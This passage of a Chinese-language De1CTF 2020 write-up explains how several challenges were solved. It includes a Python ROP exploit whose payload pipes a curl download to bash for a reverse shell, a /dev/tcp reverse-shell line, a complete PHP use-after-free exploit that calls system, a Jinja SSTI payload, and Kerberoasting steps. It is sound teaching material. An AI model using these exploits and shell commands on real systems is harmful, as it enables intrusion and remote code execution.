class="line">      php_printf(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      php_printf(<span class="string">"no file\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v4.lval = zend_strpprintf(<span class="number">0L</span>L, <span class="string">"True"</span>);</span><br><span class="line">    return_value-&gt;value = v4;</span><br><span class="line">    return_value-&gt;u1.type_info = (*(_BYTE *)(v4.lval + <span class="number">5</span>) &amp; <span class="number">2u</span>) &lt; <span class="number">1</span> ? <span class="number">5126</span> : <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>zend_parse_parameters解析传进来的参数，"s"表示解析成字符串，parameter指向解析的结果，length存放长度。</p>
<p>接下来memcpy将结果拷贝到栈上，拷贝的长度为length，有可能会大于path的大小，造成栈溢出。</p>
<p>Path的内容会先输出一下，注意到v9这个地方保存了path的地址，是为了防止本地的地址偏移和远程不一样，方便大家利用传递参数，。</p>
<p>函数本身的功能是任意文件读，给web服务使用。这样也可以读取/proc/self/maps，拿到libc地址。</p>
<p>有了libc地址就能随便rop了，直接调用system("...")即可。</p>
<p>要注意，参数不要直接用栈上path中的数据，因为函数结束后平衡了栈，这里的数据已经变成无用的了，执行system的时候可能会讲这里的内容覆盖掉，导致无法反弹shell</p>
<p>反弹shell的时候发现<code>/bin/bash -i &gt;&amp; /dev/tcp/XXX.XXX.XXX.XXX/XXXX 0&gt;&amp;1</code>这样弹不了，换了一个脚本弹可以了。</p>
<p>如果想要调试的话，需要本地搭好环境后，gdb /usr/local/bin/php，然后set breakpoint pending on，就可以下断点调试了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://134.175.185.244/select.php"</span></span><br><span class="line">url = <span class="string">"http://49.51.251.99/select.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"username"</span>:<span class="string">"admin"</span>,</span><br><span class="line">    <span class="string">"password"</span>:<span class="string">"goodlucktoyou"</span>,</span><br><span class="line">    <span class="string">"submit"</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    <span class="string">"PHPSESSID"</span>: <span class="string">"p51gfmno1tv687igcc1ndq14vh"</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line">print(res.status_code)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">100</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>:<span class="string">"a"</span>*<span class="number">100</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line">print(res.content)</span><br><span class="line">res = res.content.split(<span class="string">b'a'</span>*<span class="number">100</span>)[<span class="number">1</span>]</span><br><span class="line">stack = res[<span class="number">0</span>:<span class="number">6</span>]+<span class="string">b'\x00\x00'</span></span><br><span class="line">stack = struct.unpack(<span class="string">'&lt;Q'</span>, stack)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"[+] stack:"</span>, hex(stack))</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>: <span class="string">"/proc/self/maps"</span>,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url,data=data,cookies=cookie).content.split(<span class="string">b"\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"libc-2.28.so"</span> <span class="keyword">in</span> i:</span><br><span class="line">        libc_base = int(<span class="string">b"0x"</span> + i[<span class="number">0</span>:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"[+] libc_base:"</span>, hex(libc_base))</span><br><span class="line"></span><br><span class="line">bss_str = libc_base + <span class="number">0x0000000001C0000</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023a5f</span></span><br><span class="line">read = libc_base + <span class="number">0x00000000000EA450</span></span><br><span class="line">system = libc_base + <span class="number">0x00000000000449C0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"a"</span>*<span class="number">136</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack+<span class="number">136</span>+<span class="number">24</span>) + p64(system) + <span class="string">b"curl https://shell.now.sh/xxx.xxx.xxx.xxx:xxxx|bash\x00"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'search'</span>:payload,</span><br><span class="line">    <span class="string">'submit'</span>:<span class="string">"submit"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    res = requests.post(url,data=data,cookies=cookie)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>拿到shell之后，执行/readflag，算出表达式的值即可获得flag</p>
<blockquote>
<p>De1CTF{47ae3396-f5ce-47ab-bb64-34b5154064c4}</p>
</blockquote>
<h2><span id="easy-php-uaf">Easy PHP UAF</span></h2>
<h3><span id="解题思路">解题思路</span></h3>
<p>题目基于一个公开exp：https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php ，它利用了debug_backtrace函数的bug来实现一个UAF漏洞。通过这个漏洞，我们可以读写PHP内存。</p>
<p>要解出这道题，需要一些PHP底层相关的知识和一点点Pwn相关的思想。</p>
<p>为了加大题目的难度，我加了一些料：</p>
<ol type="1">
<li>在词法分析里面ban掉了循环结构</li>
<li>在扩展里面限制了函数执行深度</li>
<li>在php.ini里面ban掉了strlen，需要用别的方式泄露内存</li>
</ol>
<p>如果用gdb调试并弄懂原本的exp的原理，这道题目其实非常简单：</p>
<ol type="1">
<li>UAF，可以直接用原exp里面的</li>
<li>泄露下一个PHP堆块的头指针，用于计算<span class="math inline">\(helper和\)</span>abc的存放地址</li>
<li>泄露Closure Object的存放地址</li>
<li>改写$helper-&gt;a，将它伪造成一个指向Closure Object的字符串</li>
<li>从Closure Object里面泄露出Closure Handlers的地址，然后计算system的地址</li>
<li>将需要用到的Closure Object数据复制到下一个PHP堆块上面，将它的internal_function.handler改写成system地址，然后改写$helper-&gt;b，让它指向这个假的Closure Object</li>
<li>执行$helper-&gt;b来执行system</li>
</ol>
<h3><span id="exp">exp</span></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $backtrace;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span> -&gt; a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>) -&gt; getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2int</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">4</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">5</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">6</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">7</span>]);</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($offset)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc;</span><br><span class="line">        <span class="keyword">return</span> strrev(substr($abc, $offset, <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leakA</span><span class="params">($offset)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $helper;</span><br><span class="line">        <span class="keyword">return</span> strrev(substr($helper -&gt; a, $offset, <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($offset, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc;</span><br><span class="line">        $abc[$offset] = $data[<span class="number">7</span>];</span><br><span class="line">        $abc[$offset + <span class="number">1</span>] = $data[<span class="number">6</span>];</span><br><span class="line">        $abc[$offset + <span class="number">2</span>] = $data[<span class="number">5</span>];</span><br><span class="line">        $abc[$offset + <span class="number">3</span>] = $data[<span class="number">4</span>];</span><br><span class="line">        $abc[$offset + <span class="number">4</span>] = $data[<span class="number">3</span>];</span><br><span class="line">        $abc[$offset + <span class="number">5</span>] = $data[<span class="number">2</span>];</span><br><span class="line">        $abc[$offset + <span class="number">6</span>] = $data[<span class="number">1</span>];</span><br><span class="line">        $abc[$offset + <span class="number">7</span>] = $data[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">        $arg = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln -&gt; a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># UAF</span></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper -&gt; b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line">    <span class="comment"># leak head point of next php heap</span></span><br><span class="line">    $php_heap = leak(<span class="number">0x88</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"PHP Heap: "</span> . bin2hex($php_heap) . <span class="string">"\n"</span>;</span><br><span class="line">    $abc_address = str2int($php_heap) - <span class="number">0x88</span> - <span class="number">0xa0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'$abc: '</span> . dechex($abc_address) . <span class="string">"\n"</span>;</span><br><span class="line">    $closure_object = leak(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Closure Object: "</span> . bin2hex($closure_object) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># let a point to closure_object</span></span><br><span class="line">    write(<span class="number">0x10</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin(dechex(str2int($closure_object) - <span class="number">0x28</span>)));</span><br><span class="line">    write(<span class="number">0x18</span>, str_pad(<span class="string">"\x06"</span>, <span class="number">8</span>, <span class="string">"\x00"</span>, STR_PAD_LEFT));</span><br><span class="line">    <span class="comment"># leak Closure Handlers</span></span><br><span class="line">    $closure_handlers = leakA(<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Closure Handlers: "</span> . bin2hex($closure_handlers) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># compute system address</span></span><br><span class="line">    $system_address = dechex(str2int($closure_handlers) - <span class="number">10733946</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"System: "</span> . $system_address . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># build fake closure_object</span></span><br><span class="line">    write(<span class="number">0x90</span>, leakA(<span class="number">0x10</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x08</span>, leakA(<span class="number">0x18</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x10</span>, leakA(<span class="number">0x20</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x18</span>, leakA(<span class="number">0x28</span>));</span><br><span class="line">    $abc[<span class="number">0x90</span> + <span class="number">0x38</span>] = <span class="string">"\x01"</span>;</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x68</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin($system_address));</span><br><span class="line">    <span class="comment"># let b get this object</span></span><br><span class="line">    write(<span class="number">0x20</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin(dechex(str2int($php_heap) + <span class="number">0x08</span> - <span class="number">0xa0</span>)));</span><br><span class="line">    <span class="comment"># eval system</span></span><br><span class="line">    ($helper -&gt; b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="mc_logclient">mc_logclient</span></h2>
<p>文件列表： <a href="https://pastebin.com/qZxVNaqm" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p>
<p>这是一个 <code>minecraft log web client</code>。可以用于读取所有用户的日志。</p>
<p>默认python3.8环境，iptables禁止对外通讯，当然白名单了icmp，可以使用ping进行外带。（赛后发现出现非预期，由于多个题目环境处于同一网络，有队伍使用 mc 协议的对话功能带出数据）</p>
<p>玩家的日志都存储在 logs 文件夹里，以玩家 uuid 作为文件名。logs 文件夹以 只读方式 挂载到环境里。</p>
<p>一个简单的 ssti，黑名单过滤了大部分关键词。在 <code>python 3.7</code> 以后，有一个新的函数 <code>sys.breakpointhook()</code> 可以通过它起一个调试器，进行任意代码执行。</p>
<p>赛后发现，由于黑名单不完善出现非预期，可以通过 <code>\x</code> 或者 <code>request.args</code> 进行绕过，直接进行 ssti，不需要调用 <code>/write</code> 功能。</p>
<p>首先我们需要在游戏对话框里，进行先 payload 的操作。开头最好加上 <code>/</code> 将 payload 作为命令的形式进行隐藏，防止向其他选手泄露 payload。</p>
<p>payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;&#123;[].__class__.__base__.__subclasses__()[133].__init__.__globals__[&apos;sys&apos;][&apos;breakpointhook&apos;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>然后访问 <code>/read?work={work}&amp;filename={uuid}</code> 触发 ssti。</p>
<p>大概有 30秒 的时间，去调用 <code>/write</code> 往 <code>pdb</code> 去写命令。</p>
<p>详情可见 <code>exp.go</code>。</p>
<p><code>De1CTF{MC_L0g_C1ieNt-t0-S1mPl3_S2Tl~}</code></p>
<h1><span id="misc">misc</span></h1>
<h2><span id="mc_easybgm">mc_easybgm</span></h2>
<p>文件列表： <a href="https://pastebin.com/8EeQ8YCz" target="_blank" rel="noopener">mp3.py</a></p>
<p>源自于上一年在某个比赛的启发，发现可以在mp3每一帧的保留位处隐写，当时写了实现脚本，现在发现弄丢了，然后重新写了一个。</p>
<p>详情可见 <code>mp3.py</code>。</p>
<p><a href="https://en.wikipedia.org/wiki/MP3#File_structure" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/MP3#File_structure</a></p>
<p><code>De1CTF{W31c0m3_t0_Mi73CR4Ft_W0r1D_D3jAVu!}</code></p>
<h2><span id="misc-mc_joinin">misc - mc_joinin</span></h2>
<p>文件列表： <a href="https://pastebin.com/Ez5khLu5" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p>
<p>因为想要出一道mc题，然后红石题以前比赛已经出现过，所以就没有出了。</p>
<p>最近在搞网络协议开发这块，所以熟悉了一下mc协议，发现可以在此处作文章。回想起中科大校赛黑曜石浏览器那题改ua版本号，发现协议通讯也涉及版本验证，所以出了这么一道题。</p>
<p>去重新写协议很麻烦，偷懒在某hub找到一个轮子<a href="https://github.com/TyphoonMC/TyphoonLimbo" target="_blank" rel="noopener">TyphoonMC/TyphoonLimbo</a>，直接魔改。</p>
<p>游戏开放在 <code>25565</code> 端口。</p>
<p>添加服务器到列表里，发现是 <code>MC2020</code> 服务端。</p>
<p><img src="https://i.loli.net/2020/05/05/riEdb1Cu59RZcJT.png"></p>
<p>从官网得知 <code>MC2020</code> 是基于 <code>1.12</code> 开发的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Minecraft 20.20 is developed by De1ta Team based on 1.12</span><br></pre></td></tr></table></figure>
<p>所以我们可以用 <code>1.12</code> 的协议去通讯。</p>
<p>这里有两种实现方法。第一种是 MITM 中间人篡改通讯数据包里的版本号，绕过验证，成功登录游戏。第二种是直接模拟通讯协议，实现通讯。</p>
<p>参考资料：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Minecraft 1.12 Protocol(Version: 335) Wiki Page</span><br><span class="line">https://wiki.vg/index.php?title=Protocol&amp;oldid=13223</span><br></pre></td></tr></table></figure>
<p><code>exp.go</code> 包含两种解法。</p>
<p>flag藏在 <code>imgur</code> 的图片里。</p>
<p><img src="https://i.loli.net/2020/05/05/S72oQOWhYrAcBa6.png"></p>
<p><code>De1CTF{MC2020_Pr0to3l_Is_Funny-ISn't_It?}</code></p>
<h2><span id="mc_champion">mc_champion</span></h2>
<p>文件列表： <a href="https://pastebin.com/964gxEzg" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p>
<p>此题基于轮子 <a href="https://github.com/TyphoonMC/TyphoonLimbo" target="_blank" rel="noopener">TyphoonMC/TyphoonLimbo</a> 魔改而来。</p>
<p>由于这个轮子的原因，所以数据包与市面上的MC客户端不是特别兼容，会经常掉线，尤其是网络不好的情况。所以这题建议模拟 <code>1.12</code> 通讯协议，实现通讯。</p>
<p>当你进入游戏，此时处于虚空时间，除了对话，其他功能都无法使用。熟悉命令行的选手，不难发现 <code>/help</code> 命令，这是一个文字游戏。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ADMIN]</span><br><span class="line">/help -&gt; show the usage</span><br><span class="line">/uuid -&gt; show your uuid</span><br><span class="line">/status -&gt; show your status</span><br><span class="line">/items -&gt; show your items</span><br><span class="line">/exchange -&gt; make some exchange</span><br><span class="line">/shop -&gt; list all category</span><br><span class="line">/shop [category_id] -&gt; list items in category</span><br><span class="line">/buy [item_id] -&gt; buy the item</span><br><span class="line">/use [item_id] -&gt; use your item</span><br><span class="line">/attack -&gt; attack the BOSS</span><br></pre></td></tr></table></figure>
<p>玩家的物品都存储在一个 <code>slice</code> 列表里，而且每一个物品都包含以下属性，fuzz一下也不难发现这点。</p>
<blockquote>
<p>Price / Attack / Shield / HP / Food / XP</p>
</blockquote>
<p>漏洞函数位于 <code>exhcange</code> -&gt; <code>random sell</code>。 这个漏洞是我平时写代码时发现的，他会触发大概像 <code>slice</code> 出栈的功能，但是由于返回值顺序的问题，导致返回了错误的值。大致代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">func slicePop(s []int, i uint) (r []int, e int) &#123;</span><br><span class="line">    if len(s) == 0 &#123;</span><br><span class="line">        return []int&#123;&#125;, -1</span><br><span class="line">    &#125;else if len(s) == 1 &#123;</span><br><span class="line">        return []int&#123;&#125;, s[0]</span><br><span class="line">    &#125;</span><br><span class="line">    if i &gt;= uint(len(s)) &#123;</span><br><span class="line">        return s[1:], s[0]</span><br><span class="line">    &#125;</span><br><span class="line">    return append(s[:i], s[i + 1:]...), s[i]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我这里的解法是，通过不断调用此功能，获得足够多的金钱（大于200），然后使用一个TNT去打败boss。</p>
<p>当然，赛后发现还有其他解法，只需要最终打败boss即可。</p>
<p>详情可见 <code>exp.go</code>。</p>
<p>当你打败boss，你将得到编码信息。简单地进行 <code>base32解码</code> 和 <code>rot13变换</code> ，你将得到 flag 和一个隐藏命令 <code>/MC2020-DEBUG-VIEW:-)</code>。</p>
<p><code>De1CTF{S3cur3_UsAG3_0f-GO_Slice~}</code></p>
<h2><span id="life">Life</span></h2>
<p>No Game No Life!</p>
<figure>
<img src="https://i.loli.net/2020/05/06/BWRS5XzCgJfqh9o.jpg" alt><figcaption>87821588769450_.pic_hd.jpg</figcaption>
</figure>
<h3><span id="hints">Hints</span></h3>
<ol type="1">
<li>Game of Life.</li>
</ol>
<h3><span id="flag">Flag</span></h3>
<p>De1CTF{l3t_us_s7art_th3_g4m3!}</p>
<h3><span id="solution">Solution</span></h3>
<ol type="1">
<li>从jpg中分离出题目本体的zip;</li>
<li>zip内含一张黑白图片，以及另一个加密的zip;</li>
<li>将黑白图片作为康威生命游戏的输入跑一回合，得到qrcode，扫码得到zip的密码;</li>
<li>解压zip，内含一个文本文件;</li>
<li>将pilf.txt中的文本反转，debase64，再反转，HEX to ASCII，得到flag.</li>
</ol>
<h3><span id="note">Note</span></h3>
<p>这玩意主要是数据很难造，我花了好几天也没整出来怎么逆康威生命游戏状态，搜了一下好像是要ML。</p>
<p><del>不如直接把逆康威生命游戏出成一道炼丹题</del></p>
<p>现在用的密码是之前某次decoding时见到的，我把它反色过了所以直接搜是搜不出来的。</p>
<p>如果剩下几天能整出来的话就换个图。</p>
<h2><span id="easy-protocol">Easy Protocol</span></h2>
<h3><span id="hint">hint</span></h3>
<p>hint的文件头是<code>MSCF</code>，搜索一下可以知道这就是一个makecab压缩的文件，直接使用expand命令解压得到hint.txt</p>
<p>hint.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hint1: flag is De1CTF&#123;part1_part2_part3&#125;</span><br><span class="line">hint2: The part1,part2 and part3 is a pure number with a length of 8</span><br><span class="line"></span><br><span class="line">have fun!!!!!</span><br></pre></td></tr></table></figure>
<p>hint.txt应该是和流量包有关的，暂时先不管</p>
<h3><span id="part1">part1</span></h3>
<p>简单浏览一下数据包，主要把目光投到Kerberos协议和LDAP协议上，简单跟一下LDAP，发现过滤条件是：<code>(&amp;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*))(samAccountName=De1CTF2020))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))</code>，主要是这个<code>servicePrincipalName=*</code>，是查询域用户<code>De1CTF2020</code>所有存在的SPN</p>
<figure>
<img src="https://i.loli.net/2020/05/05/98zZt3wkNfog7Hi.png" alt><figcaption>9.png</figcaption>
</figure>
<p>然后后面又有一个TGS-REQ请求</p>
<figure>
<img src="https://i.loli.net/2020/05/05/raVzWJtOveiPslk.png" alt><figcaption>10.png</figcaption>
</figure>
<p>再回到hint中，应该是要你暴力破解之类的，然后猜测应该是<code>Kerberoasting</code></p>
<p>然后将TGS-REQ中的SPN和票据的<code>enc-part</code>提取出来</p>
<figure>
<img src="https://i.loli.net/2020/05/05/boYP7hWDpjUnzQV.png" alt><figcaption>8.png</figcaption>
</figure>
<p>构造成hashcat支持的hash格式，<code>$krb5tgs$23$*&lt;USERNAME&gt;$&lt;DOMAIN&gt;$&lt;SPN&gt;*$&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p>
<p>然后爆破即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 13100 